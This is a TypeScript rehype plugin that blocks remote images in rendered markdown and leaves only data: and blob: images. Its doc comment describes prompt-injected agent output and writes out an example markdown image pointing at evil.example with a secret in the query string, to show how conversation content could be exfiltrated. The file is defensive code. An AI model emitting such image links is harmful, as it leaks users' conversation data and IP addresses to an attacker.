import type { Element, ElementContent, Root } from 'hast'
import { visit } from 'unist-util-visit'

/**
 * Marker classes on the placeholder that replaces a blocked image. Plain string
 * constants (not vanilla-extract `style()` hashes) because this module is pulled into
 * the markdown WORKER bundle (markdownWorker.ts), which must not import a `.css.ts` —
 * the styling side lives in markdownContent.css.ts and imports these names from here,
 * mirroring how `codeCopyHostClass` keys the DOM-injected copy button.
 */
export const BLOCKED_IMAGE_CLASS = 'blocked-remote-image'
export const BLOCKED_IMAGE_CHIP_CLASS = 'blocked-remote-image-chip'
export const BLOCKED_IMAGE_LABEL_CLASS = 'blocked-remote-image-label'

/** Text of the chip that explains why the image isn't shown. */
export const BLOCKED_IMAGE_CHIP_TEXT = 'remote image blocked'

/**
 * The ONLY image srcs that render as an actual `<img>`: inline, self-contained payloads
 * that cost no network request. `data:` carries its bytes in the URL; `blob:` resolves
 * against this origin's own blob registry (a foreign-origin blob URL simply fails to
 * resolve — it never hits the network). Everything else is a fetch.
 */
const INLINE_IMAGE_SRC_RE = /^(?:data|blob):/i

/**
 * Rehype plugin: replace every image that would cause a NETWORK FETCH with a visible,
 * explained placeholder. Only `data:` and `blob:` srcs survive as real `<img>` elements
 * (MCP tool results and the file viewer render screenshots through those two schemes).
 *
 * Why block rather than let it load: markdown here is largely agent-authored and thus
 * prompt-injectable, and an image URL is an *outbound request* the page makes on its
 * own. `![x](https://evil.example/p.png?leak=<secret>)` exfiltrates conversation content
 * in the query string and the user's IP address (plus headers) in the request itself, with
 * no click and no visible sign. The threat is identical on web and on desktop, so the
 * block lives HERE, in the shared pipeline, rather than in a shell-specific control:
 * the desktop CSP (`img-src 'self' data: blob:` in desktop/rust/tauri.conf.json) is now
 * defense-in-depth, not the enforcement point. It never covered the whole product anyway
 * — Tauri attaches it only to assets Tauri itself serves, so desktop-distributed (which
 * navigates the webview to the remote hub) and the browser build were never protected.
 * Accepted cost: remote markdown images no longer render anywhere, including web.
 *
 * The rule is an allowlist of two schemes, so every other src form is blocked by
 * construction rather than by enumeration:
 *   - absolute `https://host/x.png`  -> blocked (third-party fetch; the exfil vector)
 *   - protocol-relative `//host/x.png` -> blocked (a remote fetch that merely LOOKS relative)
 *   - relative / root-relative `./x.png`, `/x.png`, `x.png` -> blocked. These resolve
 *     against whatever origin is hosting the app, which for desktop-distributed IS the
 *     remote hub; nothing in the product rewrites them to a real file-fetch URL, so they
 *     could only ever 404 into a broken glyph. The placeholder is strictly better.
 *   - empty/missing src -> blocked (an empty src re-fetches the current document URL).
 *
 * The placeholder keeps the author's alt text visible (it is the whole fallback) and
 * renders the src as an `<a href>` so the user can still open the image deliberately.
 * That anchor is left for the sibling `rehypeExternalLinks` pass to harden, which is why
 * this plugin must run BEFORE it: http(s) srcs become `target="_blank"` links, and every
 * other scheme (`javascript:`, `file:`, protocol-relative) is unwrapped to plain text by
 * that same single-sourced link rule instead of a second URL policy living here.
 */
export function rehypeBlockRemoteImages() {
  return (tree: Root) => {
    visit(tree, 'element', (node) => {
      if (node.tagName !== 'img')
        return
      const src = node.properties?.src
      if (typeof src === 'string' && INLINE_IMAGE_SRC_RE.test(src))
        return
      const alt = node.properties?.alt
      // Rewrite in place (tagName + properties + children) rather than splicing into the
      // parent: `<img>` is phrasing content inside a `<p>`, the `<span>` placeholder keeps
      // that valid, and an in-place swap needs no parent/index and can't be skipped for a
      // root-level image node.
      toPlaceholder(node, typeof src === 'string' ? src : '', typeof alt === 'string' ? alt : '')
    })
  }
}

/** Turn `node` into `<span class="blocked-remote-image">[chip][alt-or-url link]</span>`. */
function toPlaceholder(node: Element, src: string, alt: string): void {
  const children: ElementContent[] = [{
    type: 'element',
    tagName: 'span',
    properties: { className: [BLOCKED_IMAGE_CHIP_CLASS] },
    children: [{ type: 'text', value: BLOCKED_IMAGE_CHIP_TEXT }],
  }]
  // Prefer the author's own description; fall back to the URL so the placeholder is never
  // an unexplained chip on its own.
  const label = alt.trim() || src
  if (label) {
    children.push({
      type: 'element',
      tagName: 'a',
      properties: { className: [BLOCKED_IMAGE_LABEL_CLASS], href: src, title: src },
      children: [{ type: 'text', value: label }],
    })
  }
  node.tagName = 'span'
  node.properties = { className: [BLOCKED_IMAGE_CLASS] }
  node.children = children
}
